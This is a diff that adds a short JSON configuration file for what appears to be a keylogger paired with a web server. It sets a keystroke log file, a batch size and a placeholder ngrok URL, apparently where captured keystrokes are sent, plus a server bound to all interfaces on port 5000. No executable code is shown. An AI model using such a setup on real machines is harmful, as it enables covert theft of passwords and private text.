@@ -1,0 +1,13 @@
+{
+    "keylogger": {
+        "log_file_path": "logs/keylog.txt",
+        "batch_size": 10,
+        "server_url": "https://your-ngrok-url.ngrok-free.app"
+    },
+    "web_server": {
+        "log_file_path": "logs/keylog.txt",
+        "host": "0.0.0.0",
+        "port": 5000,
+        "debug": false
+    }
+}
